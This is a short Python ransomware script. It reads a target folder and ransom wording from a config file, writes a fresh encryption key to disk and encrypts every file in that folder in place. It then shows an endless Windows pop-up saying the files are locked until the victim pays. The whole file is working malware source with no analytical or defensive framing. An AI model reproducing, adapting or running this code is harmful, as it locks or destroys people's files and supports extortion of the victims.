import os

from cryptography.fernet import Fernet

# -- Setting up config
import configparser
config = configparser.ConfigParser()

# Locating config.ini
dir = os.path.dirname(os.path.abspath(__file__))
config_file = f'{dir}\config.ini'

config.read(config_file)

title = config.get('MAIN', 'title')
payment_note = config.get('MAIN', 'payment_note')
path_to_encrypt = config.get('MAIN', 'path_to_encrypt')

os.chdir(path_to_encrypt)
run_dir = os.getcwd()

# -- /Setting up config

# Defs
def encrypt():
    files = []

    for file in os.listdir():
        if file == __file__:
            continue
        if file == "key.key":
            continue
        if file == "decrpyt.py":
            continue
        if os.path.isfile(file):
            files.append(file)

    key = Fernet.generate_key()

    with open("key.key", "wb") as myKey:
        myKey.write(key)

    for file in files:
        with open(file, "rb") as cur_file:
            contents = cur_file.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as cur_file:
            cur_file.write(contents_encrypted)


# /Defs

# Main loop

desc = f"""
This is important! You're computer just ran what's called a ransomware.

Some or all of your files in {run_dir} have been locked and you need a special program to unlock them.
Do not try to unlock the files by yourself, or they may be broken forever.

You will recive the password for this once you {payment_note}
"""

encrypt()
while True:
    import ctypes  # An included library with Python install.   
    ctypes.windll.user32.MessageBoxW(0, desc, title, 0)
